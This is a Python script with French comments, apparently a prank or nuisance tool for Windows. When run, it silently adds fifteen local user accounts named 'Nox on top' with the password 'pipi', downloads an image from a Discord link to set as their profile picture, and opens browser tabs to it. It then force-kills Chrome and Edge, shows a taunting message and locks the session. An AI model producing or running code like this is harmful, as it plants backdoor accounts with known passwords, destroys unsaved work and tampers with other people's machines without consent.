import ctypes
import os
import time
import shutil
import urllib.request
import webbrowser
import tkinter as tk
import subprocess

# 1. Ajouter plusieurs utilisateurs avec le mot de passe "pipi" et le nom de compte "Nox on top"
def add_users():
    for i in range(1, 16):  # Ajouter 15 utilisateurs
        username = f"Nox on top {i}"
        password = "pipi"
        try:
            os.system(f'net user "{username}" {password} /add')
            print(f"Utilisateur {username} ajouté.")
        except Exception as e:
            print(f"Erreur lors de l'ajout de l'utilisateur {username}: {e}")

# 2. Changer la photo de profil
def change_profile_picture():
    image_url = "https://cdn.discordapp.com/attachments/1339570046338596966/1343259645585784903/IMG_1568.png?ex=67bc9f88&is=67bb4e08&hm=0948002f851ce1ebb74dfa8eda85d867700ce8f4be9b6c9d29ae48fc8ccb9b2f&"
    image_path = "C:\\Users\\Public\\profile_image.png"  # Emplacement temporaire pour l'image

    # Télécharger l'image
    urllib.request.urlretrieve(image_url, image_path)

    # Déplacer l'image dans le dossier des photos de profil pour chaque utilisateur
    for i in range(1, 16):  # Appliquer à 15 utilisateurs
        username = f"Nox on top {i}"
        destination = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\AccountPictures\\user.bmp"
        try:
            shutil.copy(image_path, destination)
            print(f"Photo de profil pour {username} changée avec succès.")
        except Exception as e:
            print(f"Erreur lors du changement de la photo de profil pour {username}: {e}")

    # Supprimer l'image temporaire
    os.remove(image_path)

# 3. Ouvrir des pages Internet avec l'URL spécifiée
def open_infinite_tabs(url):
    for _ in range(10):  # Limité à 10 ouvertures pour éviter d'empêcher la machine de fonctionner
        webbrowser.open(url)
        time.sleep(0.5)  # Ajouter un délai entre chaque ouverture pour ne pas saturer le système

# 4. Fermer tous les onglets après 15 secondes
def close_browser_tabs():
    # Fermer tous les processus Chrome (ou autre navigateur)
    try:
        os.system("taskkill /F /IM chrome.exe")  # Pour Chrome
        os.system("taskkill /F /IM msedge.exe")  # Pour Microsoft Edge
        print("Tous les onglets ont été fermés.")
    except Exception as e:
        print(f"Erreur lors de la fermeture des onglets: {e}")

# 5. Afficher une boîte de texte "Bien joué ! Ton pc a survécu !"
def show_success_message():
    root = tk.Tk()
    root.title("Message")
    label = tk.Label(root, text="Bien joué ! Ton pc a survécu !", font=("Arial", 24))
    label.pack(padx=20, pady=20)
    button = tk.Button(root, text="OK", command=root.destroy, font=("Arial", 12))
    button.pack(pady=10)
    root.mainloop()

# 6. Verrouiller la session après 3 secondes
def lock_session():
    time.sleep(3)  # Attendre 3 secondes avant de verrouiller
    ctypes.windll.user32.LockWorkStation()

# Script principal
def main():
    # 1. Ajouter les utilisateurs
    add_users()

    # 2. Changer la photo de profil pour chaque utilisateur
    change_profile_picture()

    # 3. Ouvre des onglets internet avec l'image en fond
    open_infinite_tabs("https://cdn.discordapp.com/attachments/1339570046338596966/1343259645585784903/IMG_1568.png?ex=67bc9f88&is=67bb4e08&hm=0948002f851ce1ebb74dfa8eda85d867700ce8f4be9b6c9d29ae48fc8ccb9b2f&")

    # 4. Attendre 15 secondes avant de fermer les onglets
    time.sleep(15)
    close_browser_tabs()

    # 5. Afficher le message "Bien joué ! Ton pc a survécu !"
    show_success_message()

    # 6. Verrouiller la session après 3 secondes
    lock_session()

if __name__ == "__main__":
    main()
